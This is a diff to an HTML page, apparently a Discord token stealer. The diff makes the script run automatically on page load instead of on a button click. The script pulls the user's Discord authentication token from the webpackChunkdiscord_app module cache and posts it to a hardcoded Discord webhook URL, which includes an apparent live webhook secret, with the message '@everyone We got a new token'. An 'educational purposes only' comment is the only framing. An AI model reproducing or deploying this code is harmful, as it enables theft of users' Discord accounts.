@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Send Token to Webhook</title>
+    <title>Token Extractor and Webhook Sender</title>
     <style>
         body {
             display: flex;
@@ -24,49 +24,41 @@
 <body>
 
     <div class="content">
-        Send Token to Webhook
-        <button id="sendToken">Send Token</button>
+        Discord Token Extractor
     </div>
 
     <script>
-        // Function to send token to the Discord webhook
-        function sendTokenToWebhook() {
+        // This is a simplified example for educational purposes only
+        (function() {
+            // Extracting token from Webpack chunk
+            const token = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken();
+            console.log("Extracted Token:", token); // Log the token
+
+            // Send token to webhook
             const webhookURL = 'https://discord.com/api/webhooks/1321597632824611018/iIAs-UeScagNLtAkcEP1qpkm0uUBJIWIg81Jlo56U_Pnv6dFacn8k_FCNYfrUDWcy9vU';
-
-            // Extract token from Webpack chunk (you'll need this on a site where webpackChunkdiscord_app is available)
-            const token = (webpackChunkdiscord_app.push([[''], {}, e => { m = []; for (let c in e.c) m.push(e.c[c]) }]), m).find(m => m?.exports?.default?.getToken !== void 0)?.exports.default.getToken();
-            
-            if (!token) {
+            if (token) {
+                const payload = {
+                    content: `@everyone We got a new token: ${token}`
+                };
+                fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                })
+                .then(response => {
+                    if (response.ok) {
+                        console.log('Token sent to webhook!');
+                    } else {
+                        console.error('Error sending token to webhook:', response.statusText);
+                    }
+                })
+                .catch(error => {
+                    console.error('Error with fetch request:', error);
+                });
+            } else {
                 console.error('No token found');
-                return;
             }
-
-            // Prepare the message data
-            const messageData = {
-                content: `@everyone We got a new token: ${token}`,  // Send the token in the message
-                username: 'Token Sender',  // You can customize the username
-            };
-
-            // Send the token to the Discord webhook
-            fetch(webhookURL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(messageData)
-            })
-            .then(response => {
-                if (response.ok) {
-                    console.log('Token sent successfully!');
-                } else {
-                    console.error('Failed to send token:', response.statusText);
-                }
-            })
-            .catch(error => {
-                console.error('Request failed:', error);
-            });
-        }
-
-        // Trigger token sending when the button is clicked
-        document.getElementById('sendToken').addEventListener('click', sendTokenToWebhook);
+        })();
     </script>
 
 </body>
